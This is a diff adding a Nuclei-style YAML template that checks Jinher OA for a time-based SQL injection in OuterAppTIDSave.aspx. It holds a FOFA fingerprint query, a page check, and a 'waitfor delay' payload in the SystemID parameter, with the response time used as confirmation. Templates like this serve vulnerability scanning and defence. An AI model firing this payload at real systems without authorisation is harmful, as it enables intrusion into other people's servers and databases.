@@ -1,0 +1,50 @@
+id: poc-yaml-jinher-outerapptidsave-aspx-sqli
+info:
+  name: 金和OA OuterAppTIDSave.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 金和OA
+    fofa: app="金和网络-金和OA"
+
+variables:
+  t1: "{{rand_int(2,5)}}"
+  t2: "{{to_number(t1) + to_number(t1)}}"
+  t3: "{{to_number(t2) + 2}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: check-base-page
+    method: GET
+    path:
+      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "JHSoft"
+        part: body
+
+  - id: check-sqli-vulnerability
+    method: GET
+    path:
+      - "{{BaseURL}}/c6/Jhsoft.Web.AddMenu/OuterAppTIDSave.aspx/?SystemID='waitfor+delay'0:0:{{t1}}'--&OuterAppTID=1&AppTID=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "false"
+        part: body
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t2)"
+          - "duration <= to_number(t3)"
